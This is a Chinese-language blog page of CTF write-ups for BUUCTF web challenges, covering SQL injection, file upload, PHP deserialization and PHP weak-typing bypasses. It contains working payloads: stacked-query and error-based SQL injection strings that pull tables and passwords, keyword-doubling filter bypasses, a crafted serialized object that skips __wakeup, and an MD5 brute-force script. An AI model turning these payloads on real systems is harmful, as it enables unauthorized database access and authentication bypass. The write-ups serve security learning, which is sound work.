<!DOCTYPE HTML>
<html lang="zh-CN">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="buuctf, q1n9&#39;s blog">
    <meta name="description" content="[极客大挑战 2019]EasySQL1单引号围的SQL的语法格式规定–和后面的注释内容必须间隔一个空格在SQL注入中，“–+”可用于注释是因为在SQL语法里，“– ”（后面有空格）是标准的单行注释起始标识，“+”在这里可能是为了绕过某些过">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="referrer" content="no-referrer-when-downgrade">
    <!-- Global site tag (gtag.js) - Google Analytics -->


    <title>buuctf | q1n9&#39;s blog</title>
    <link rel="icon" type="image/png" href="/favicon.png">
    


    <!-- bg-cover style     -->



<link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
<link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
<link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
<link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
<link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
<link rel="stylesheet" type="text/css" href="/css/matery.css">
<link rel="stylesheet" type="text/css" href="/css/my.css">
<link rel="stylesheet" type="text/css" href="/css/dark.css" media="none" onload="if(media!='all')media='all'">




    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
    <link rel="stylesheet" href="/css/post.css">




    



    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>

<meta name="generator" content="Hexo 7.3.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head>


<body>
    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">q1n9&#39;s blog</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>首页</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>标签</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>分类</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>归档</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>关于</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/contact" class="waves-effect waves-light">
      
      <i class="fas fa-comments" style="zoom: 0.6;"></i>
      
      <span>留言板</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/friends" class="waves-effect waves-light">
      
      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
      
      <span>友情链接</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
    </a>
  </li>
  <li>
    <a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="深色/浅色模式" >
      <i id="sum-moon-icon" class="fas fa-sun" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">q1n9&#39;s blog</div>
        <div class="logo-desc">
            
            welcome to my blog
            
        </div>
    </div>

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			首页
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			标签
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			分类
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			归档
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			关于
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/contact" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-comments"></i>
			
			留言板
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/friends" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-address-book"></i>
			
			友情链接
		</a>
          
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://github.com/lingqing777/lingqing777.github.io" class="waves-effect waves-light" target="_blank">
                <i class="fab fa-github-square fa-fw"></i>Fork Me
            </a>
        </li>
        
    </ul>
</div>


        </div>

        
            <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://github.com/lingqing777/lingqing777.github.io" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="Fork Me" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>

</header>

    



<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/6.jpg')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">buuctf</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tags/ctf/">
                                <span class="chip bg-color">ctf</span>
                            </a>
                        
                            <a href="/tags/wp/">
                                <span class="chip bg-color">wp</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                    <div class="post-cate">
                        <i class="fas fa-bookmark fa-fw icon-category"></i>
                        
                            <a href="/categories/%E7%BD%91%E5%AE%89/" class="post-category">
                                网安
                            </a>
                        
                    </div>
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
                    2025-01-25
                </div>
                

                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
                    2025-08-26
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
                    21.1k
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
                    94 分
                </div>
                

                
                    <div id="busuanzi_container_page_pv" class="info-break-policy">
                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
                        <span id="busuanzi_value_page_pv"></span>
                    </div>
				
            </div>
        </div>
        <hr class="clearfix">

        
        <!-- 是否加载使用自带的 prismjs. -->
        <link rel="stylesheet" href="/libs/prism/prism.min.css">
        

        

        <div class="card-content article-card-content">
            <div id="articleContent">
                <h3 id="极客大挑战-2019-EasySQL1"><a href="#极客大挑战-2019-EasySQL1" class="headerlink" title="[极客大挑战 2019]EasySQL1"></a>[极客大挑战 2019]EasySQL1</h3><p><img src="https://pick.lwzheng.tech/2024/12/18/6762547f9722a.png" alt="dfb8a353c0093c82c669db8e48864047.png"><br>单引号围的<br><img src="https://pick.lwzheng.tech/2024/12/18/6762547ec1f87.png" alt="37dcb4e8076a072d3478e3ee63d26e0d.png"><br>SQL的语法格式规定–和后面的注释内容必须间隔一个空格<br>在SQL注入中，“–+”可用于注释是因为在SQL语法里，“– ”（后面有空格）是标准的单行注释起始标识，“+”在这里可能是为了绕过某些过滤机制。当数据库执行SQL语句时，遇到“– ”就会忽略后面的内容，攻击者利用这个特性，通过构造包含“–+”的恶意语句，使后面的查询逻辑被注释掉，从而达到改变查询原意、获取非法数据等目的。<br>所以一定要有空格啊（</p>
<hr>
<h3 id="强网杯-2019-随便注1"><a href="#强网杯-2019-随便注1" class="headerlink" title="[强网杯 2019]随便注1"></a>[强网杯 2019]随便注1</h3><p><img src="https://pick.lwzheng.tech/2024/12/18/676254f13ad0c.png" alt="0a223de355e17decc72863de26a72b52.png"><br><img src="https://pick.lwzheng.tech/2024/12/18/676254f188ae2.png" alt="5a777138a26db07c378cadba24a77570.png"><br><img src="https://pick.lwzheng.tech/2024/12/18/676254f251310.png" alt="215b05e5165b0a292062e36954c398b1.png"><br><img src="https://pick.lwzheng.tech/2024/12/18/676254f31481b.png" alt="236c845da78aa517ba031f0b2b554f48.png"><br><img src="https://pick.lwzheng.tech/2024/12/18/676254f6c7017.png" alt="98d0595f1c0374397a3d1370b7306369.png"><br><img src="https://pick.lwzheng.tech/2024/12/18/676254f77a903.png" alt="2f6ceaccb29373f6fdf89f7a6b651bdb.png"><br><img src="https://pick.lwzheng.tech/2024/12/18/6762c639590d8.png" alt="5dbad5fe33b7be4a387406654588dc4a.png"><br><a href="https://">https://www.mysqlzh.com/doc/126/253.html</a></p>
<pre class="line-numbers language-none"><code class="language-none">1';
handler `1919810931114514` open;
handler `1919810931114514` read first;#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>这道题我好像被剧透了（，本来想打开小本本翻一翻堆叠（因为我越看越熟悉，好像要用这个），结果发现堆叠就是从这道题抄的（<br><img src="https://pick.lwzheng.tech/2024/12/18/6762763fcad8d.png" alt="2ee162ea82c68b0b28b3ac8f6996d071.png"></p>
<pre class="line-numbers language-none"><code class="language-none">1';handler `1919810931114514` open as`ddl`;
handler `ddl` read next;--
一样<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<hr>
<h3 id="极客大挑战-2019-HardSQL1"><a href="#极客大挑战-2019-HardSQL1" class="headerlink" title="[极客大挑战 2019]HardSQL1"></a>[极客大挑战 2019]HardSQL1</h3><p>先放个字典<br><a href="https://">https://www.cnblogs.com/CVE-Lemon/p/16187971.html</a><br><img src="https://pick.lwzheng.tech/2024/12/18/6762554c94cf7.png" alt="afdd780a3c26cc0291a0ff2edfbf27c5.png"><br>/**/,%20，=都被过滤了，但like没被过滤换=;and也被搞了，用or（burp可见，反正过滤了一堆，就不放图了<br><img src="https://pick.lwzheng.tech/2024/12/18/6762554811cd5.png" alt="75d480ea766c77feff663a8247a6ac96.png"><br>limit没被过滤，说明是空格被过滤了<br><img src="https://pick.lwzheng.tech/2024/12/18/67625547539f8.png" alt="30e79d19bae056941cd635f627db1854.png"><br>查一个新的<br><img src="https://pick.lwzheng.tech/2024/12/18/676255467d276.png" alt="1c7660abc9397a5f09c54c68feadd623.png"><br>%A0不可<br><img src="https://pick.lwzheng.tech/2024/12/18/676255458d8b4.png" alt="0ef86a801db09c991dc813e96465423a.png"><br><img src="https://pick.lwzheng.tech/2024/12/18/67625544864a8.png" alt="dd6be0eecab7f9fbb43422f88041b2e7.png"><br>（）可，尝试了下可为<code>1'or(1)like(1)#</code>，万能密码成功后发现只有这个，用报错注入<br><img src="https://pick.lwzheng.tech/2024/12/18/67627335bef31.png" alt="15b57d9a0152f4a97cf94568454d8e96.png"><br>我用我的那个报错注入的方法发现一直不对，然后发现是rand被过滤了。<del>好好好，三种方法选了一种就正好被过滤了</del><br><img src="https://pick.lwzheng.tech/2024/12/18/676255439ec72.png" alt="467fa8d31cd839e3b1d0cc4f10819f9e.png"><br>那就换个<br>[<a target="_blank" rel="noopener" href="https://www.cnblogs.com/csyxf/p/10241456.html]">https://www.cnblogs.com/csyxf/p/10241456.html]</a>(https://）extractvalue无事，遂用<br><img src="https://pick.lwzheng.tech/2024/12/18/67625542b93af.png" alt="91bf424956abef30cb47ef6c4db7022f.png"><br>这里我发现直接用hackbar传不对，然后在登录界面重新尝试了一下，并观察上方网址，发现需要用URL编码后再execute<br><del>（可能是因为过滤的太多了吧，太屑了</del><br><code>1'or(extractvalue(0x7e,concat(0x7e,(select(database())))))#</code><br><img src="https://pick.lwzheng.tech/2024/12/18/67626e7fde819.png" alt="3fa376449c53c54edcb9227885473a8a.png"><br><code>1'or(extractvalue(0x7e,concat(0x7e(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like('geek')))))#</code><br><img src="https://pick.lwzheng.tech/2024/12/18/67626e787aefc.png" alt="894a4b1c6d1a51c1fd51954ac75dde7d.png"><br><code>1'or(extractvalue(0x7e,concat(0x7e(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1')))))#</code><br><img src="https://pick.lwzheng.tech/2024/12/18/67626e78ef348.png" alt="77d4fac4a64b308ec7f3098ee092cf1e.png"><br><code>1'or(extractvalue(0x7e,concat(0x7e,(select(group_concat(password))from(geek.H4rDsq1)))))#</code><br><img src="https://pick.lwzheng.tech/2024/12/18/67626e79b2b08.png" alt="85556fa19c74c093ea33a47a536d314e.png"><br>然后发现substr被过滤了（悲<br><img src="https://pick.lwzheng.tech/2024/12/18/67626e7ab2063.png" alt="ab4c261fdcca91d8108362ae777a8491.png"><br>遂再找（<br><a href="https://">https://www.wanfa688.com/html/Products/478771.html</a><br>试了一下left和right都挺安全的<br><img src="https://pick.lwzheng.tech/2024/12/18/67626e80aed15.png" alt="3f3cf8afbbb43a3fa4b255b6a7080e0f.png"><br><code>1'or(extractvalue(0x7e,concat(0x7e,right((select(group_concat(password))from(geek.H4rDsq1)),31))))#</code><br><img src="https://pick.lwzheng.tech/2024/12/18/67626e81e2af4.png" alt="398dde33f15ac6556d2337bf694af22f.png"><br>拼一下<br><code>flag{589e7b10-f37f-4255-84d3-a323ae257d5b}</code></p>
<hr>
<p><del>话说sqlmap能不能再多出一些脚本什么的，不够用哇</del><br><del>等我复习完cpp一定高产似那啥咕咕咕咕</del></p>
<h3 id="ACTF2020-新生赛-Upload1"><a href="#ACTF2020-新生赛-Upload1" class="headerlink" title="[ACTF2020 新生赛]Upload1"></a>[ACTF2020 新生赛]Upload1</h3><p>随机挑选一个幸运儿（<br><img src="https://pick.lwzheng.tech/2024/12/18/6762d57f10d02.png" alt="c52edc539d97fb471a45ef6083cf100e.png"><br><del>五毒俱全</del><br><img src="https://pick.lwzheng.tech/2024/12/18/6762d57f0a7e7.png" alt="1636aeb681a2402a389c787dac4292c7.png"></p>
<hr>
<h3 id="GXYCTF2019-BabyUpload1"><a href="#GXYCTF2019-BabyUpload1" class="headerlink" title="[GXYCTF2019]BabyUpload1"></a>[GXYCTF2019]BabyUpload1</h3><p>总之试了试好像普通png,gif,.htaccess都不可，普通的jpg可<br>然后点进了题目下的链接（<br><img src="https://pick.lwzheng.tech/2024/12/20/6765700acb68f.png" alt="759d44425892524fda812388b57711e6.png"><br><del>(辣么大个链接总之就是直接点进去了</del><br><a href="https://">http://9fd24382-f481-438e-a0be-28adc1a81bac.node5.buuoj.cn:81</a><br><img src="https://pick.lwzheng.tech/2024/12/20/67656d90ba5d7.png" alt="b624b5b858e10f870886fa4a0ea31a52.png"><br><del>那就按它的要求来吧</del><br><img src="https://pick.lwzheng.tech/2024/12/20/676570f188114.png" alt="8d021b4aad2303f305dfffb268acc12e.png"><br><img src="https://pick.lwzheng.tech/2024/12/20/67656d90732aa.png" alt="5186e40e3c2c83506375d1ef8f67352c.png"><br>还有要注意访问的路径是从upload后开始</p>
<hr>
<h4 id="suprise-egg"><a href="#suprise-egg" class="headerlink" title="suprise egg"></a>suprise egg</h4><p><del>总之是被警告了</del><br><img src="https://pick.lwzheng.tech/2024/12/20/67656f2c6b0ae.png" alt="d05e7988e0592d25d4a302c53052a38c.png"><br><del>被攻击了，buu你有什么头绪吗</del></p>
<hr>
<p>好好好终于把第二周的要求内容肝完了，这回真的要咕咕咕咕咕咕咕了<br><del>绝对不是因为什么最近沉迷看cs2比赛</del><br>话说这个Hashcoin有什么用么，<del>集齐100个是不是能召唤神龙</del></p>
<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/0ccd0a6165944604cf2a0641cd6e4538.png"></p>
<h3 id="极客大挑战-2019-BabySQL1"><a href="#极客大挑战-2019-BabySQL1" class="headerlink" title="[极客大挑战 2019]BabySQL1"></a>[极客大挑战 2019]BabySQL1</h3><p>绕过，<del>似曾相识的方法</del><br><code>?username=1&amp;password=1' uunionnion sselectelect 1,2,3--+</code><br><del>我赌1包辣条information绝对是被from牵连的！！！（震怒）</del><br><img src="https://pick.lwzheng.tech/2025/01/12/6783e1495ce3c.png" alt="e383ecc0ef4ca571f5e0f3cc5405760c.png"><br><code>?username=1&amp;password=1' uunionnion sselectelect 1,2,group_concat(table_name) ffromrom infoorrmation_schema.tables wwherehere table_schema=database()--+</code><br>经典二选一，geekuser大失败（悲）<br><img src="https://pick.lwzheng.tech/2025/01/12/6783e3920c467.png" alt="99665abe50f908d6b7b1eee17ca0eadb.png"><br><img src="https://pick.lwzheng.tech/2025/01/12/6783e3c0e718e.png" alt="f045cddb3e1a5ec3786df7f1aa9fc37f.png"><br><del>唉，2077世界</del></p>
<hr>
<h3 id="极客大挑战-2019-PHP1"><a href="#极客大挑战-2019-PHP1" class="headerlink" title="[极客大挑战 2019]PHP1"></a>[极客大挑战 2019]PHP1</h3><p><img src="https://pick.lwzheng.tech/2025/01/14/67864452c785f.png" alt="0bc4e1d145789dc6a1b306c25a22d48d.png"><br><a href="https://">https://www.runoob.com/php/php-unserialize-function.html</a><br><a href="https://">https://www.runoob.com/php/php-serialize-function.html</a><br><a href="https://">https://twle.cn/c/yufei/phpmmethod/phpmmethod-basic-wakeup.html</a></p>
<pre class="line-numbers language-none"><code class="language-none">《?php
include 'flag.php';


error_reporting(0);


class Name{
    private $username = 'nonono';
    private $password = 'yesyes';

    public function __construct($username,$password){
        $this-&gt;username = $username;
        $this-&gt;password = $password;
    }

    function __wakeup(){
        $this-&gt;username = 'guest';
    }#会给username再赋值

    function __destruct(){
        if ($this-&gt;password != 100) {
            echo "&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;";
            echo "You name is: ";
            echo $this-&gt;username;echo "&lt;/br&gt;";
            echo "You password is: ";
            echo $this-&gt;password;echo "&lt;/br&gt;";
            die();
        }
        if ($this-&gt;username === 'admin') {
            global $flag;
            echo $flag;
        }else{
            echo "&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can't give you the flag!";
            die();

            
        }
    }
}

?》
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <pre class="line-numbers language-none"><code class="language-none">include 'class.php';
    $select = $_GET['select'];
    $res=unserialize(@$select);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>?select=</p>
<pre class="line-numbers language-none"><code class="language-none">《?php
class Name
{
    private $username = 'admin';
    private $password = 100;
}
$a=new Name;
echo serialize($a);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>O:4:”Name”:2:{s:14:” Name username”;s:5:”admin”;s:14:” Name password”;i:100;}<br>在反序列化时，当前属性个数大于实际属性个数时，就会跳过__wakeup()，去执行__destruct<br>O:4:”Name”:3:{s:14:” Name username”;s:5:”admin”;s:14:” Name password”;i:100;}<br>但还是说no,hacker<del>(破音）</del><br><img src="https://pick.lwzheng.tech/2025/01/14/678649cf11905.png" alt="2bec80f91e6bfad2870d1f2232683db7.png"></p>
<blockquote>
<p>%00是对象序列化后不可见字符对应的url编码，如果直接将序列化结果复制浏览器中，因为字符不可见所以会变成空格，所以我们要手动加上这个%00</p>
</blockquote>
<p><del>好吧终于知道图中不明字符了</del><br>?select=O:4:”Name”:3:{s:14:”%00Name%00username”;s:5:”admin”;s:14:”%00Name%00password”;i:100;}</p>
<hr>
<h3 id="ACTF2020-新生赛-BackupFile1"><a href="#ACTF2020-新生赛-BackupFile1" class="headerlink" title="[ACTF2020 新生赛]BackupFile1"></a>[ACTF2020 新生赛]BackupFile1</h3><p><img src="https://pick.lwzheng.tech/2025/01/14/67865bfc2411e.png" alt="d6269676d01904af0f453fddb1fb6814.png"><br><a href="https://">https://www.runoob.com/php/php-is_numeric-function.html</a><br><a href="https://">https://www.runoob.com/php/php-intval-function.html</a></p>
<pre class="line-numbers language-none"><code class="language-none">《?php
include_once "flag.php";

if(isset($_GET['key'])) 
{
    $key = $_GET['key'];
    if(!is_numeric($key)) #is_numeric() 函数用于检测变量是否为数字或数字字符串。
    {
        exit("Just num!");
    }
    $key = intval($key);#intval() 函数用于获取变量的整数值。
    $str = "123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3";
    if($key == $str) {
        echo $flag;
    }
}
else {
    echo "Try to find out source file!";
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>在PHP中：<br>== 为弱相等，即当整数和字符串类型相比较时。会先将字符串转化为整数然后再进行比较。比如a=123和b=123admin456进行==比较时。则b只会截取前面的整数部分。即b转化成123。<br><code>?key=123</code></p>
<hr>
<h3 id="BJDCTF2020-Easy-MD51"><a href="#BJDCTF2020-Easy-MD51" class="headerlink" title="[BJDCTF2020]Easy MD51"></a>[BJDCTF2020]Easy MD51</h3><p><del>不是源代码的copy者，只是源代码的搬运工。。。</del><br><a href="https://">https://www.runoob.com/php/func-filesystem-file-get-contents.html</a><br><a href="https://">https://www.iteye.com/blog/jun1986-1176909</a></p>
<pre class="line-numbers language-none"><code class="language-none">《?php
header('hint:select * from \'admin\' where password='.'md5($pass,true)');
?&gt;
《?php
error_reporting(0);
$password = $_GET['password'];

if($password == 'ffifdyop')#看见==，似乎知道要考弱类型。。。
{
    echo "&lt;script&gt;window.location.replace('./levels91.php')&lt;/script&gt;";#window.location.replace(“url”)：将地址替换成新url，该方法通过指定URL替换当前缓存在历史里（客户端）的项目，
}

?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-none"><code class="language-none">《?php
error_reporting(0);
$a = $_GET['a'];
$b = $_GET['b'];

if($a != $b &amp;&amp; md5($a) == md5($b))#看见==，似乎知道要考弱类型。。。
{
    echo "&lt;script&gt;window.location.replace('./levell14.php')&lt;/script&gt;";
}
?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="https://pick.lwzheng.tech/2025/01/16/6787e1522f1ff.png" alt="7d1a019efadddab9ceae5ab701ab76fe.png"><br><del>唉，爆了爆了</del>，=》glzjin<a href="https://">https://github.com/glzjin</a></p>
<pre class="line-numbers language-none"><code class="language-none">《?php
error_reporting(0);
include "flag.php";

highlight_file(__FILE__);

if($_POST['param1']!==$_POST['param2']&amp;&amp;md5($_POST['param1'])===md5($_POST['param2'])){
    echo $flag;
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><del>此时我才意识到不该看源代码的，相当于看wp了，我又又又又忘了（哭</del><br><del>好吧就当我什么也没看到（</del><br>burp找到的<br><img src="https://pick.lwzheng.tech/2025/01/16/678861c433699.png" alt="372588dbab00b81c163759fc1c782888.png"><br><a href="https://">https://www.w3school.com.cn/php/func_string_md5.asp</a><br>md5=》为’ ‘ or 1(true)即可通过<br>在mysql里面，在用作布尔型判断时，以1开头的字符串会被当做整型数。<br>要注意的是这种情况是必须要有单引号括起来的，比如password=‘xxx’ or ‘1xxxxxxxxx’，那么就相当于password=‘xxx’ or 1 ，也就相当于password=‘xxx’ or true，所以返回值就是true。<br>布尔值：布尔值&nbsp;false&nbsp;本身为假。<br>整数：值为&nbsp;0&nbsp;的整数被视为&nbsp;false&nbsp;，例如&nbsp;0&nbsp;、&nbsp;0.0&nbsp;（因为在比较时&nbsp;0.0&nbsp;会被转换为整数&nbsp;0&nbsp;）。<br>空字符串：&nbsp;“”&nbsp;（双引号）或者&nbsp;‘’&nbsp;（单引号）空字符串为假。<br>空数组：&nbsp;array()&nbsp;或者&nbsp;[]&nbsp;表示的空数组被判定为&nbsp;false&nbsp;。<br>特殊类型值：&nbsp;null&nbsp;和&nbsp;undefined&nbsp;（在PHP严格模式下没有真正的&nbsp;undefined&nbsp;，不过在一些比较宽松的情况下可以类似理解）被判定为&nbsp;false&nbsp;。<br>未初始化的变量：在一些情况下，未初始化的变量如果在条件判断中使用，会发出警告并且被视为&nbsp;false&nbsp;。<br>其他情况一般都被判定为&nbsp;true<br>只要’or’后面的字符串为一个非零的数字开头都会返回True<br>偷的脚本</p>
<pre class="line-numbers language-none"><code class="language-none">《?php
for ($i = 0;;) {
    for ($c = 0; $c &lt; 1000000; $c++, $i++)
        if (stripos(md5($i, true), '\'or\'') !== false)#stripos() 函数查找字符串在另一字符串中第一次出现的位置（不区分大小写）找一下or哈
            echo "\nmd5($i) = " . md5($i, true) . "\n";
    echo ".";
}
?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>找到一个<br><img src="https://pick.lwzheng.tech/2025/01/16/67887746f3929.png" alt="605c2ccf2407e4c907602cdff46897c8.png"><br>但从源代码<code>if($password == 'ffifdyop')</code>来看已经定死了ffifdyop（唉，定制<br><del>估计出题人想的是特例秒了没想到会有憨憨真的一个一个找</del><br>这是”ffifdyop”md5后<br><img src="https://pick.lwzheng.tech/2025/01/16/678878af4544a.png" alt="dbe8bbbaaee382b724bb08151d262e0d.png"><br>然后考md5碰撞<br><a href="https://">https://blog.csdn.net/qq_64201116/article/details/126493091</a><del>(唉已经有前人栽树了</del></p>
<blockquote>
